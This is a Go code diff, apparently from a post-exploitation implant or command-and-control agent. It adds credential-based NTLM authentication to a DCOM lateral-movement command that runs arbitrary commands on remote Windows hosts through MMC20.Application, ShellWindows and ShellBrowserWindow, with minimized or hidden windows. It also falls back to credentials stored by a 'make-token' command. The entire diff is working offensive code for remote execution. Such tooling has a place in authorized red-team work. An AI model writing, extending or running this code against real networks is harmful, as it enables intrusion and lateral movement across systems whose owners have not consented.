@@ -28,12 +28,15 @@ func (c *DcomCommand) Description() string {
 }
 
 type dcomArgs struct {
-	Action  string `json:"action"`
-	Host    string `json:"host"`
-	Object  string `json:"object"`
-	Command string `json:"command"`
-	Args    string `json:"args"`
-	Dir     string `json:"dir"`
+	Action   string `json:"action"`
+	Host     string `json:"host"`
+	Object   string `json:"object"`
+	Command  string `json:"command"`
+	Args     string `json:"args"`
+	Dir      string `json:"dir"`
+	Username string `json:"username"`
+	Password string `json:"password"`
+	Domain   string `json:"domain"`
 }
 
 // DCOM COM object CLSIDs
@@ -45,9 +48,42 @@ var (
 
 // ole32.dll for CoCreateInstanceEx
 var (
-	ole32DCOM                 = windows.NewLazySystemDLL("ole32.dll")
-	procCoCreateInstanceEx    = ole32DCOM.NewProc("CoCreateInstanceEx")
+	ole32DCOM              = windows.NewLazySystemDLL("ole32.dll")
+	procCoCreateInstanceEx = ole32DCOM.NewProc("CoCreateInstanceEx")
 )
+
+// RPC authentication constants
+const (
+	rpcCAuthnWinNT           = 10 // NTLMSSP
+	rpcCAuthzNone            = 0
+	rpcCAuthnLevelConnect    = 2
+	rpcCImpLevelImpersonate  = 3
+	eoacNone                 = 0
+	secWinNTAuthIdentityUnic = 0x2 // SEC_WINNT_AUTH_IDENTITY_UNICODE
+	clsctxRemoteServer       = 0x10
+)
+
+// secWinNTAuthIdentityW matches SEC_WINNT_AUTH_IDENTITY_W for NTLM auth
+type secWinNTAuthIdentityW struct {
+	User           *uint16
+	UserLength     uint32
+	Domain         *uint16
+	DomainLength   uint32
+	Password       *uint16
+	PasswordLength uint32
+	Flags          uint32
+}
+
+// coAuthInfo matches COAUTHINFO for COM remote authentication
+type coAuthInfo struct {
+	dwAuthnSvc           uint32
+	dwAuthzSvc           uint32
+	pwszServerPrincName  *uint16
+	dwAuthnLevel         uint32
+	dwImpersonationLevel uint32
+	pAuthIdentityData    uintptr
+	dwCapabilities       uint32
+}
 
 // COSERVERINFO structure for remote COM activation
 type coServerInfo struct {
@@ -63,8 +99,6 @@ type multiQI struct {
 	pItf uintptr
 	hr   int32
 }
-
-const clsctxRemoteServer = 0x10
 
 func (c *DcomCommand) Execute(task structs.Task) structs.CommandResult {
 	var args dcomArgs
@@ -97,6 +131,27 @@ func (c *DcomCommand) Execute(task structs.Task) structs.CommandResult {
 	}
 }
 
+// resolveCredentials determines which credentials to use for DCOM auth.
+// Priority: explicit params > stored make-token credentials
+func resolveCredentials(args dcomArgs) (domain, username, password string, hasExplicit bool) {
+	// Check explicit params first
+	if args.Username != "" && args.Password != "" {
+		domain = args.Domain
+		if domain == "" {
+			domain = "."
+		}
+		return domain, args.Username, args.Password, true
+	}
+
+	// Fall back to stored credentials from make-token
+	creds := GetIdentityCredentials()
+	if creds != nil {
+		return creds.Domain, creds.Username, creds.Password, true
+	}
+
+	return "", "", "", false
+}
+
 func dcomExec(args dcomArgs) structs.CommandResult {
 	if args.Host == "" {
 		return structs.CommandResult{
@@ -120,11 +175,11 @@ func dcomExec(args dcomArgs) structs.CommandResult {
 
 	switch object {
 	case "mmc20":
-		return dcomExecMMC20(args.Host, args.Command, args.Args, args.Dir)
+		return dcomExecMMC20(args)
 	case "shellwindows":
-		return dcomExecShellWindows(args.Host, args.Command, args.Args, args.Dir)
+		return dcomExecShellWindows(args)
 	case "shellbrowser":
-		return dcomExecShellBrowser(args.Host, args.Command, args.Args, args.Dir)
+		return dcomExecShellBrowser(args)
 	default:
 		return structs.CommandResult{
 			Output:    fmt.Sprintf("Unknown DCOM object: %s\nAvailable: mmc20, shellwindows, shellbrowser", args.Object),
@@ -135,7 +190,8 @@ func dcomExec(args dcomArgs) structs.CommandResult {
 }
 
 // createRemoteCOM creates a COM object on a remote host via CoCreateInstanceEx.
-func createRemoteCOM(host string, clsid *ole.GUID) (*ole.IDispatch, error) {
+// If credentials are provided, they are passed via COAUTHINFO in COSERVERINFO.
+func createRemoteCOM(host string, clsid *ole.GUID, domain, username, password string) (*ole.IDispatch, error) {
 	hostUTF16, err := windows.UTF16PtrFromString(host)
 	if err != nil {
 		return nil, fmt.Errorf("invalid host: %v", err)
@@ -143,6 +199,35 @@ func createRemoteCOM(host string, clsid *ole.GUID) (*ole.IDispatch, error) {
 
 	serverInfo := &coServerInfo{
 		pwszName: hostUTF16,
+	}
+
+	// If credentials are provided, build COAUTHINFO with SEC_WINNT_AUTH_IDENTITY
+	if username != "" && password != "" {
+		userUTF16, _ := windows.UTF16PtrFromString(username)
+		domainUTF16, _ := windows.UTF16PtrFromString(domain)
+		passwordUTF16, _ := windows.UTF16PtrFromString(password)
+
+		authIdentity := &secWinNTAuthIdentityW{
+			User:           userUTF16,
+			UserLength:     uint32(len(username)),
+			Domain:         domainUTF16,
+			DomainLength:   uint32(len(domain)),
+			Password:       passwordUTF16,
+			PasswordLength: uint32(len(password)),
+			Flags:          secWinNTAuthIdentityUnic,
+		}
+
+		authInfo := &coAuthInfo{
+			dwAuthnSvc:           rpcCAuthnWinNT,
+			dwAuthzSvc:           rpcCAuthzNone,
+			pwszServerPrincName:  nil,
+			dwAuthnLevel:         rpcCAuthnLevelConnect,
+			dwImpersonationLevel: rpcCImpLevelImpersonate,
+			pAuthIdentityData:    uintptr(unsafe.Pointer(authIdentity)),
+			dwCapabilities:       eoacNone,
+		}
+
+		serverInfo.pAuthInfo = uintptr(unsafe.Pointer(authInfo))
 	}
 
 	qi := multiQI{
@@ -175,7 +260,7 @@ func createRemoteCOM(host string, clsid *ole.GUID) (*ole.IDispatch, error) {
 
 // dcomExecMMC20 executes a command via MMC20.Application DCOM object.
 // Path: Document.ActiveView.ExecuteShellCommand(command, dir, args, "7")
-func dcomExecMMC20(host, command, args, dir string) structs.CommandResult {
+func dcomExecMMC20(args dcomArgs) structs.CommandResult {
 	runtime.LockOSThread()
 	defer runtime.UnlockOSThread()
 
@@ -192,10 +277,20 @@ func dcomExecMMC20(host, command, args, dir string) structs.CommandResult {
 	}
 	defer ole.CoUninitialize()
 
-	mmc, err := createRemoteCOM(host, clsidMMC20)
+	domain, username, password, hasCreds := resolveCredentials(args)
+	credInfo := ""
+	if hasCreds {
+		credInfo = fmt.Sprintf("\n  Auth: %s\\%s (explicit)", domain, username)
+	}
+
+	mmc, err := createRemoteCOM(args.Host, clsidMMC20, domain, username, password)
 	if err != nil {
+		hint := ""
+		if !hasCreds {
+			hint = "\n  Hint: Use make-token first or provide -username/-password/-domain params"
+		}
 		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to create MMC20.Application on %s: %v", host, err),
+			Output:    fmt.Sprintf("Failed to create MMC20.Application on %s: %v%s", args.Host, err, hint),
 			Status:    "error",
 			Completed: true,
 		}
@@ -228,10 +323,11 @@ func dcomExecMMC20(host, command, args, dir string) structs.CommandResult {
 
 	// ExecuteShellCommand(Command, Directory, Parameters, WindowState)
 	// WindowState "7" = SW_SHOWMINNOACTIVE (minimized, no focus)
+	dir := args.Dir
 	if dir == "" {
 		dir = "C:\\Windows\\System32"
 	}
-	_, err = oleutil.CallMethod(view, "ExecuteShellCommand", command, dir, args, "7")
+	_, err = oleutil.CallMethod(view, "ExecuteShellCommand", args.Command, dir, args.Args, "7")
 	if err != nil {
 		return structs.CommandResult{
 			Output:    fmt.Sprintf("ExecuteShellCommand failed: %v", err),
@@ -241,7 +337,7 @@ func dcomExecMMC20(host, command, args, dir string) structs.CommandResult {
 	}
 
 	return structs.CommandResult{
-		Output:    fmt.Sprintf("DCOM MMC20.Application executed on %s:\n  Command: %s\n  Args: %s\n  Directory: %s\n  Method: Document.ActiveView.ExecuteShellCommand", host, command, args, dir),
+		Output:    fmt.Sprintf("DCOM MMC20.Application executed on %s:\n  Command: %s\n  Args: %s\n  Directory: %s\n  Method: Document.ActiveView.ExecuteShellCommand%s", args.Host, args.Command, args.Args, dir, credInfo),
 		Status:    "success",
 		Completed: true,
 	}
@@ -249,7 +345,7 @@ func dcomExecMMC20(host, command, args, dir string) structs.CommandResult {
 
 // dcomExecShellWindows executes a command via ShellWindows DCOM object.
 // Path: Item().Document.Application.ShellExecute(command, args, dir, "open", 0)
-func dcomExecShellWindows(host, command, args, dir string) structs.CommandResult {
+func dcomExecShellWindows(args dcomArgs) structs.CommandResult {
 	runtime.LockOSThread()
 	defer runtime.UnlockOSThread()
 
@@ -266,10 +362,20 @@ func dcomExecShellWindows(host, command, args, dir string) structs.CommandResult
 	}
 	defer ole.CoUninitialize()
 
-	shellWin, err := createRemoteCOM(host, clsidShellWindows)
+	domain, username, password, hasCreds := resolveCredentials(args)
+	credInfo := ""
+	if hasCreds {
+		credInfo = fmt.Sprintf("\n  Auth: %s\\%s (explicit)", domain, username)
+	}
+
+	shellWin, err := createRemoteCOM(args.Host, clsidShellWindows, domain, username, password)
 	if err != nil {
+		hint := ""
+		if !hasCreds {
+			hint = "\n  Hint: Use make-token first or provide -username/-password/-domain params"
+		}
 		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to create ShellWindows on %s: %v", host, err),
+			Output:    fmt.Sprintf("Failed to create ShellWindows on %s: %v%s", args.Host, err, hint),
 			Status:    "error",
 			Completed: true,
 		}
@@ -313,10 +419,11 @@ func dcomExecShellWindows(host, command, args, dir string) structs.CommandResult
 	app := appResult.ToIDispatch()
 
 	// ShellExecute(File, vArgs, vDir, vOperation, vShow)
+	dir := args.Dir
 	if dir == "" {
 		dir = "C:\\Windows\\System32"
 	}
-	_, err = oleutil.CallMethod(app, "ShellExecute", command, args, dir, "open", 0)
+	_, err = oleutil.CallMethod(app, "ShellExecute", args.Command, args.Args, dir, "open", 0)
 	if err != nil {
 		return structs.CommandResult{
 			Output:    fmt.Sprintf("ShellExecute failed: %v", err),
@@ -326,7 +433,7 @@ func dcomExecShellWindows(host, command, args, dir string) structs.CommandResult
 	}
 
 	return structs.CommandResult{
-		Output:    fmt.Sprintf("DCOM ShellWindows executed on %s:\n  Command: %s\n  Args: %s\n  Directory: %s\n  Method: Item().Document.Application.ShellExecute", host, command, args, dir),
+		Output:    fmt.Sprintf("DCOM ShellWindows executed on %s:\n  Command: %s\n  Args: %s\n  Directory: %s\n  Method: Item().Document.Application.ShellExecute%s", args.Host, args.Command, args.Args, dir, credInfo),
 		Status:    "success",
 		Completed: true,
 	}
@@ -334,7 +441,7 @@ func dcomExecShellWindows(host, command, args, dir string) structs.CommandResult
 
 // dcomExecShellBrowser executes a command via ShellBrowserWindow DCOM object.
 // Path: Document.Application.ShellExecute(command, args, dir, "open", 0)
-func dcomExecShellBrowser(host, command, args, dir string) structs.CommandResult {
+func dcomExecShellBrowser(args dcomArgs) structs.CommandResult {
 	runtime.LockOSThread()
 	defer runtime.UnlockOSThread()
 
@@ -351,10 +458,20 @@ func dcomExecShellBrowser(host, command, args, dir string) structs.CommandResult
 	}
 	defer ole.CoUninitialize()
 
-	browser, err := createRemoteCOM(host, clsidShellBrowserWd)
+	domain, username, password, hasCreds := resolveCredentials(args)
+	credInfo := ""
+	if hasCreds {
+		credInfo = fmt.Sprintf("\n  Auth: %s\\%s (explicit)", domain, username)
+	}
+
+	browser, err := createRemoteCOM(args.Host, clsidShellBrowserWd, domain, username, password)
 	if err != nil {
+		hint := ""
+		if !hasCreds {
+			hint = "\n  Hint: Use make-token first or provide -username/-password/-domain params"
+		}
 		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to create ShellBrowserWindow on %s: %v", host, err),
+			Output:    fmt.Sprintf("Failed to create ShellBrowserWindow on %s: %v%s", args.Host, err, hint),
 			Status:    "error",
 			Completed: true,
 		}
@@ -386,10 +503,11 @@ func dcomExecShellBrowser(host, command, args, dir string) structs.CommandResult
 	app := appResult.ToIDispatch()
 
 	// ShellExecute(File, vArgs, vDir, vOperation, vShow)
+	dir := args.Dir
 	if dir == "" {
 		dir = "C:\\Windows\\System32"
 	}
-	_, err = oleutil.CallMethod(app, "ShellExecute", command, args, dir, "open", 0)
+	_, err = oleutil.CallMethod(app, "ShellExecute", args.Command, args.Args, dir, "open", 0)
 	if err != nil {
 		return structs.CommandResult{
 			Output:    fmt.Sprintf("ShellExecute failed: %v", err),
@@ -399,7 +517,7 @@ func dcomExecShellBrowser(host, command, args, dir string) structs.CommandResult
 	}
 
 	return structs.CommandResult{
-		Output:    fmt.Sprintf("DCOM ShellBrowserWindow executed on %s:\n  Command: %s\n  Args: %s\n  Directory: %s\n  Method: Document.Application.ShellExecute", host, command, args, dir),
+		Output:    fmt.Sprintf("DCOM ShellBrowserWindow executed on %s:\n  Command: %s\n  Args: %s\n  Directory: %s\n  Method: Document.Application.ShellExecute%s", args.Host, args.Command, args.Args, dir, credInfo),
 		Status:    "success",
 		Completed: true,
 	}
